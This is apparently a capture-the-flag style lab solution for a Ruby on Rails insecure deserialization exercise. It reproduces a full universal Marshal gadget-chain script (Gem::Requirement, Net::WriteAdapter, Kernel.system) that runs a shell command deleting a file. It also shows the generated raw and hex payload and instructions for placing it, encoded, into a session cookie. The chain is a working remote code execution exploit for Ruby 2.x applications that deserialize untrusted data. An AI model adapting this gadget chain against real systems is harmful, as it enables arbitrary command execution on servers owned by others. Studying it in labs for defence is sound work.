
# Description
This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

# Solution

found ruby code to generate deserialization payload in https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

by trying different payloads on site we can reveal ruby version 2.7.0

```
sh: 1: reading: not found /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError) from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write' from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<' from /usr/lib/ruby/2.7.0/rubygems/request_set.rb:400:in `resolve' from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write' from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<' from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG' from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read' from /usr/lib/ruby/2.7.0/rubygems/package/tar_header.rb:103:in `from' from /usr/lib/ruby/2.7.0/rubygems/package/tar_reader.rb:61:in `each' from /usr/lib/ruby/2.7.0/rubygems/requirement.rb:297:in `fix_syck_default_key_in_requirements' from /usr/lib/ruby/2.7.0/rubygems/requirement.rb:207:in `marshal_load' from -e:13:in `load' from -e:13:in `<main>'
```

I started shell with ruby2.7.0 

```sh
sudo docker run -it ruby:2.7 /bin/bash
```

Insert into file our exploit, change command to execute, in our case it is deleting /home/carlos/morale.txt
Create this file, to validate poc is working
execute ruby exploit
examine that poc is working and file is deleted

```sh
root@4a38352a2cb5:/app# (cat ) > exploit.rb
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts payload.unpack('H*')[0]
puts Marshal.load(payload)
root@4a38352a2cb5:/app# mkdir /home/carlos
root@4a38352a2cb5:/app# touch /home/carlos/morale.txt
root@4a38352a2cb5:/app# ls /home/carlos/morale.txt
/home/carlos/morale.txt
root@4a38352a2cb5:/app# ruby exploit.rb 
"\x04\b[\bc\x15Gem::SpecFetcherc\x13Gem::InstallerU:\x15Gem::Requirement[\x06o:\x1CGem::Package::TarReader\x06:\b@ioo:\x14Net::BufferedIO\a;\ao:#Gem::Package::TarReader::Entry\a:\n@readi\x00:\f@headerI\"\baaa\x06:\x06ET:\x12@debug_outputo:\x16Net::WriteAdapter\a:\f@socketo:\x14Gem::RequestSet\a:\n@setso;\x0E\a;\x0Fm\vKernel:\x0F@method_id:\vsystem:\r@git_setI\"\x1Frm /home/carlos/morale.txt\x06;\fT;\x12:\fresolve"
04085b08631547656d3a3a5370656346657463686572631347656d3a3a496e7374616c6c6572553a1547656d3a3a526571756972656d656e745b066f3a1c47656d3a3a5061636b6167653a3a546172526561646572063a0840696f6f3a144e65743a3a4275666665726564494f073b076f3a2347656d3a3a5061636b6167653a3a5461725265616465723a3a456e747279073a0a407265616469003a0c40686561646572492208616161063a0645543a124064656275675f6f75747075746f3a164e65743a3a577269746541646170746572073a0c40736f636b65746f3a1447656d3a3a52657175657374536574073a0a40736574736f3b0e073b0f6d0b4b65726e656c3a0f406d6574686f645f69643a0b73797374656d3a0d406769745f73657449221f726d202f686f6d652f6361726c6f732f6d6f72616c652e747874063b0c543b123a0c7265736f6c7665
```

```sh
root@4a38352a2cb5:/app# ls /home/carlos/morale.txt
ls: cannot access '/home/carlos/morale.txt': No such file or directory
```

Take outputed payload in hex, base64 encoded and url encode, insert into session cookie 